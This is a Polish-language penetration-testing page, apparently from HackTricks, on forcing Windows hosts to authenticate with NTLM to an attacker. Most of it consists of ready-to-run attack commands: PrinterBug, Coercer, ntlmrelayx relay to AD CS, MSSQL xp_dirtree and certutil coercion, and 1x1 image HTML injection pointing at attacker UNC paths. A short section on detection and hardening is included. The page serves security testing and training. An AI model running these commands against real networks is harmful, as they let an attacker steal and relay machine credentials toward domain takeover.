# Wymuszenie uwierzytelniania NTLM z uprawnieniami

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) to **zbiór** **zdalnych wyzwalaczy uwierzytelniania**, napisanych w C# przy użyciu kompilatora MIDL, aby uniknąć zależności od oprogramowania firm trzecich.

## Nadużycie usługi Spooler

Jeśli usługa _**Print Spooler**_ jest **włączona,** możesz użyć znanych już poświadczeń AD, aby **zażądać** od serwera wydruku Kontrolera domeny **aktualizacji** o nowych zadaniach drukowania, a następnie po prostu kazać mu **wysłać powiadomienie do wybranego systemu**.\
Pamiętaj, że gdy drukarka wysyła powiadomienie do dowolnego systemu, musi się **uwierzytelnić w tym** **systemie**. Dlatego atakujący może sprawić, że usługa _**Print Spooler**_ uwierzytelni się w dowolnym systemie, a podczas tego uwierzytelniania usługa **użyje konta komputera**.

Od strony technicznej klasyczny prymityw **PrinterBug** wykorzystuje **`RpcRemoteFindFirstPrinterChangeNotificationEx`** przez **`\\PIPE\\spoolss`**. Atakujący najpierw otwiera uchwyt drukarki/serwera, a następnie podaje fałszywą nazwę klienta w `pszLocalMachine`, dzięki czemu docelowy spooler tworzy kanał powiadomień **z powrotem do hosta kontrolowanego przez atakującego**. Dlatego skutkiem jest **wymuszenie uwierzytelniania wychodzącego**, a nie bezpośrednie wykonanie kodu.<sup>[[2]](#references)</sup>\
Jeśli szukasz **RCE/LPE** w samym spoolerze, sprawdź [PrintNightmare](printnightmare.md). Ta strona koncentruje się na **wymuszaniu uwierzytelniania i relay**.

### Wyszukiwanie serwerów Windows w domenie

Użyj PowerShell, aby wyświetlić hosty Windows. Serwery są zwykle celami o najwyższym priorytecie, więc najpierw skup się na nich:

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### Wykrywanie nasłuchujących usług Spooler

Używając nieznacznie zmodyfikowanego narzędzia [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autorstwa @mysmartlogin (Vincenta Le Touxa), sprawdź, czy Spooler Service nasłuchuje:

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

Możesz również użyć `rpcdump.py` w systemie Linux i poszukać protokołu **MS-RPRN**:

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

Lub szybko testuj hosty z Linuksa za pomocą **NetExec/CrackMapExec**:

```bash
nxc smb targets.txt -u user -p password -M spooler
```

Jeśli chcesz **wyliczyć powierzchnie wymuszania uwierzytelnienia**, zamiast tylko sprawdzać, czy endpoint spoolera istnieje, użyj **trybu skanowania Coercer**:<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

To przydatne, ponieważ zobaczenie endpointu w EPM mówi jedynie, że interfejs RPC drukowania jest zarejestrowany. **Nie** gwarantuje to, że każda metoda wymuszania jest dostępna przy obecnych uprawnieniach ani że host wygeneruje użyteczny przepływ uwierzytelniania.

### Poproś usługę o uwierzytelnienie się względem dowolnego hosta

Możesz skompilować [SpoolSample z oryginalnego repozytorium](https://github.com/leechristensen/SpoolSample).

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

lub użyj [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) lub [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), jeśli korzystasz z Linuksa

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

Za pomocą **Coercer** możesz bezpośrednio atakować interfejsy spoolera i uniknąć zgadywania, która metoda RPC jest udostępniona:<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### Nowoczesne wywołania zwrotne RPC-over-TCP

Nie zakładaj, że udane wywołanie `RpcRemoteFindFirstPrinterChangeNotificationEx` musi generować ruch przez TCP/445. **Windows 11 22H2 i nowsze wersje domyślnie używają RPC over TCP do komunikacji z usługą drukowania**; RPC over named pipes jest wyłączone, chyba że przywróci je zasada lub ustawienie `RpcUseNamedPipeProtocol=1`. Dlatego starsze nasłuchujące usługi obsługujące wyłącznie SMB mogą zgłaszać wysłanie wyzwalacza, mimo że nigdy nie otrzymują wywołania zwrotnego. Microsoft dokumentuje TCP/135 (Endpoint Mapper) oraz dynamiczne porty RPC dla standardowego RPC używanego przez usługę drukowania; organizacje mogą ograniczyć ten zakres lub wybrać stały port RPC dla tej usługi.<sup>[[10]](#references)</sup>

Obecna wersja **Impacket `ntlmrelayx.py`** zawiera serwer RPC relay i niewielki Endpoint Mapper, domyślnie włączony na TCP/135. Obsługę tę dodano w czerwcu 2025 r. specjalnie na potrzeby zaprezentowanego łańcucha PrinterBug-to-AD-CS, umożliwiając przekazanie uwierzytelnionego wywołania zwrotnego RPC nawet wtedy, gdy ofiara nie przełącza się na SMB/WebDAV.<sup>[[11]](#references)</sup>

Obsługa RPC relay/EPM jest dostępna w **Impacket 0.13.0 i nowszych**. Zanim zaczniesz diagnozować brak nasłuchu na TCP/135, upewnij się, że nie jest uruchamiana starsza, spakowana wersja `ntlmrelayx.py`; w wyniku polecenia pomocy powinny być widoczne przełączniki serwera RPC.<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

Szukaj `Setting up RPC Server on port 135` i `RPCD: Received connection` w danych wyjściowych relay. Jeśli wywołanie RPC zwraca oczekiwany błąd, ale nic nie dociera do listenera, sprawdź politykę transportu RPC drukowania na ofierze, filtrowanie ruchu wychodzącego, rozwiązywanie DNS oraz to, czy inny proces nie korzysta już z TCP/135. Upewnij się też, że `ntlmrelayx` nie został uruchomiony z opcją `--no-rpc-server`.

### Wymuszanie HTTP zamiast SMB za pomocą WebClient

W systemach nadal używających **RPC przez nazwane potoki** (starsze kompilacje lub zachowanie przywrócone przez politykę) klasyczny PrinterBug zwykle powoduje uwierzytelnienie **SMB** do `\\attacker\share`, co nadal może być przydatne do **capture**, **relay do celów HTTP** lub **relay, gdy nie ma SMB signing**.\
Jednak relay **SMB do SMB** jest często blokowany przez **SMB signing**, dlatego operatorzy mogą preferować wymuszenie uwierzytelnienia **HTTP/WebDAV**. Nie jest to rozwiązanie awaryjne dla opisanego powyżej zachowania RPC-over-TCP.

Jeśli na celu działa usługa **WebClient**, listener można określić w formie, która sprawi, że Windows użyje **WebDAV przez HTTP**:

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

Jest to szczególnie przydatne przy łączeniu z **`ntlmrelayx --adcs`** lub innymi celami HTTP relay, ponieważ pozwala uniknąć polegania na możliwości przeprowadzenia SMB relay na wymuszonym połączeniu. Ważne zastrzeżenie: aby wariant HTTP/WebDAV działał, na ofierze musi być uruchomiony **WebClient**.

### Łączenie z Unconstrained Delegation

Jeśli atakujący przejął komputer skonfigurowany z [Unconstrained Delegation](unconstrained-delegation.md), może **wymusić uwierzytelnienie drukarki na tym komputerze**. **TGT** konta komputera drukarki zostaje wtedy zapisany w pamięci hosta z unconstrained delegation, skąd atakujący może go pobrać i ponownie wykorzystać za pomocą [Pass the Ticket](pass-the-ticket.md).

### Uwagi dotyczące wykrywania i hardeningu

Najpewniejszym sposobem usunięcia PrinterBug z kontrolera domeny, PAW lub serwera, który nie obsługuje drukowania, jest zatrzymanie i wyłączenie usługi Spooler. Tam, gdzie drukowanie jest wymagane, należy wzmocnić zabezpieczenia wszystkich możliwych celów relay (podpisywanie SMB server, podpisywanie LDAP/wiązanie kanału i EPA w usługach HTTP, takich jak AD CS), zamiast zakładać, że blokowanie TCP/445 na ścieżce callback jest wystarczające.<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

Jeśli host nadal musi obsługiwać **drukowanie lokalne**, bardziej precyzyjną kontrolą jest GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Zapobiega to akceptowaniu przez spooler zdalnych połączeń klientów (i udostępnianiu drukarek), pozostawiając usługę dostępną lokalnie; po zastosowaniu ustawienia uruchom ponownie spooler, a następnie ponów opisane wyżej testy dostępności MS-RPRN.<sup>[[13]](#references)</sup>

Wykrywanie powinno korelować uwierzytelnione wywołanie MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, zwłaszcza opnum 62/65 z wartością callbacku inną niż lokalna, z natychmiastowym wychodzącym połączeniem SMB, HTTP lub RPC z hosta spoolera. Twórz wzorce bazowe dla **UUID/opnum interfejsów oraz par źródło/cel**, a nie tylko dla dostępu do `\PIPE\spoolss`, ponieważ współczesne stosy drukowania mogą kierować callback przez RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Macierz wymuszania połączeń ze ścieżką UNC przez RPC (interfejsy/opnum wyzwalające uwierzytelnianie wychodzące)
- MS-RPRN (Print System Remote Protocol)
  - Potok: \\PIPE\\spoolss
  - IF UUID: 12345678-1234-abcd-ef00-0123456789ab
  - Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - Narzędzia: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - Potok: \\PIPE\\spoolss
  - IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
  - Uwagi: asynchroniczny interfejs drukowania w tym samym potoku spoolera; użyj Coercer, aby wyliczyć dostępne metody na danym hoście<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - Potoki: \\PIPE\\efsrpc (również przez \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
  - IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
  - Często nadużywane opnums: 0, 4, 5, 6, 7, 12, 13, 15, 16
  - Narzędzie: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - Potok: \\PIPE\\netdfs
  - IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
  - Narzędzie: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - Potok: \\PIPE\\FssagentRpc
  - IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
  - Narzędzie: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - Potok: \\PIPE\\even
  - IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum: 9 ElfrOpenBELW
  - Narzędzie: CheeseOunce<sup>[[1]](#references)</sup>

Uwaga: Te metody przyjmują parametry, które mogą zawierać ścieżkę UNC (np. `\\attacker\share`). Podczas ich przetwarzania Windows uwierzytelni się do tej ścieżki UNC w kontekście komputera/użytkownika, umożliwiając przechwycenie lub przekazanie NetNTLM.\
W przypadku nadużycia spoolera **MS-RPRN opnum 65** pozostaje najczęściej używanym i najlepiej udokumentowanym prymitywem, ponieważ specyfikacja protokołu wyraźnie stwierdza, że serwer tworzy kanał powiadomień zwrotnych do klienta wskazanego przez `pszLocalMachine`.<sup>[[2]](#references)</sup>

### Wymuszanie uwierzytelniania przez MS-EVEN: ElfrOpenBELW (opnum 9)
- Interfejs: MS-EVEN przez \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Sygnatura wywołania: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Efekt: cel próbuje otworzyć podaną ścieżkę pliku kopii zapasowej dziennika i uwierzytelnia się do kontrolowanej przez atakującego ścieżki UNC.<sup>[[1]](#references)</sup>
- Zastosowanie praktyczne: wymuś na zasobach Tier 0 (DC/RODC/Citrix/itp.) wysłanie NetNTLM, a następnie przekaż je do punktów końcowych AD CS (scenariusze ESC8/ESC11) lub innych uprzywilejowanych usług.<sup>[[1]](#references)</sup>

## PrivExchange

Atak `PrivExchange` wynika z luki w funkcji **Exchange Server `PushSubscription`**. Funkcja ta pozwala dowolnemu użytkownikowi domeny posiadającemu skrzynkę pocztową wymusić na serwerze Exchange uwierzytelnienie się przez HTTP do hosta wskazanego przez klienta.

Domyślnie **usługa Exchange działa jako SYSTEM** i ma nadmierne uprawnienia (konkretnie, przed aktualizacją Cumulative Update z 2019 r. ma uprawnienia **WriteDacl w domenie**). Lukę tę można wykorzystać do **przekazania informacji do LDAP, a następnie wyodrębnienia bazy danych NTDS domeny**. Jeśli przekazanie do LDAP nie jest możliwe, lukę nadal można wykorzystać do przekazania uwierzytelnienia do innych hostów w domenie. Skuteczne wykorzystanie tego ataku zapewnia natychmiastowy dostęp do konta Domain Admin przy użyciu dowolnego uwierzytelnionego konta użytkownika domeny.

## Wewnątrz Windows

Jeśli masz już dostęp do maszyny Windows, możesz wymusić na Windows połączenie z serwerem przy użyciu uprzywilejowanych kont za pomocą:

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

Lub użyj tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Można użyć certutil.exe jako lolbin (pliku binarnego podpisanego przez Microsoft), aby wymusić uwierzytelnianie NTLM:

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### Przez e-mail

Jeśli znasz **adres e-mail** użytkownika, który loguje się na komputerze, który chcesz zaatakować, możesz po prostu wysłać mu **e-mail z obrazem 1x1**, taki jak na przykład

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

Gdy ofiara otworzy plik, Windows spróbuje się uwierzytelnić.

### MitM

Jeśli możesz przeprowadzić atak MitM i wstrzyknąć HTML do strony wyświetlanej przez ofiarę, spróbuj wstrzyknąć obraz, na przykład:

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## Inne sposoby wymuszania i wyłudzania uwierzytelniania NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Łamanie NTLMv1

Jeśli możesz przechwycić wyzwania [NTLMv1, tutaj przeczytasz, jak je złamać](../ntlm/index.html#ntlmv1-attack).\
_Pamiętaj, że aby złamać NTLMv1, musisz ustawić challenge Respondera na „1122334455667788”_



## References

- [1] [Unit 42 – Wymuszanie uwierzytelniania wciąż ewoluuje](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: protokół zdalnego dostępu do dziennika zdarzeń](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Aktualizacje połączeń RPC dla drukowania w Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – serwer przekazywania RPC i Endpoint Mapper dla ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket – wydanie 0.13.0](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Zezwalaj usłudze Print Spooler na akceptowanie połączeń klientów](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
